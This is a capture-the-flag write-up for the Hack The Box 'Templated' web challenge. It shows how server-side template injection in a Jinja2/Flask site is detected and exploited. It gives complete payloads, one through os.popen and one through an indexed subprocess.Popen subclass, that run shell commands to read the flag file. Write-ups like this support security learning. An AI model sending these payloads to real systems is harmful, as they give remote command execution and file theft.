---
title: HTB Templated - Writeup
date: "2021-12-26"
draft: false
tags: ["hackthebox", "challenges", "web", "js", "writeup"]
---

## Navigating through the website

Requested: `GET /invalid` -> we got `invalid`

![](/img/templated/Pasted%20image%2020211226121920.png)

## Verifying if SSTI is possible

Requested: `GET /invalid{{7*7}}` -> we got `invalid49` instead of `invalid{{7*7}}`

![](/img/templated/Pasted%20image%2020211226121844.png)

We know that it is Jinja2 and Flask, so we can use their payload.

## Getting the flag

Requested: `GET /{{config.__class__.__init__.__globals__['os'].popen('cat%20flag.txt').read()}}` -> we got the flag

![](/img/templated/Pasted%20image%2020211226182358.png)

### Alternative
**Finding `subprocess.Popen` index.**

1. `GET /{{''.__class__.mro()[1].__subclasses__()[100:]` -> Popen is there in the list
![](/img/templated/Pasted%20image%2020211226184612.png)
2. `GET /{{''.__class__.mro()[1].__subclasses__()[300:]` -> Popen is there in the list
3. `GET /{{''.__class__.mro()[1].__subclasses__()[500:]` -> Internal Server Error
4. `GET /{{''.__class__.mro()[1].__subclasses__()[400:]` -> Popen is there in the list
5. `GET /{{''.__class__.mro()[1].__subclasses__()[450:]` -> Popen is NOT there in the list
6. `GET /{{''.__class__.mro()[1].__subclasses__()[414]` -> Popen exists

`GET /{{''.__class__.mro()[1].__subclasses__()[414]('cat%20flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}` 




References:
- https://blog.nvisium.com/p263
- https://blog.nvisium.com/p255
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection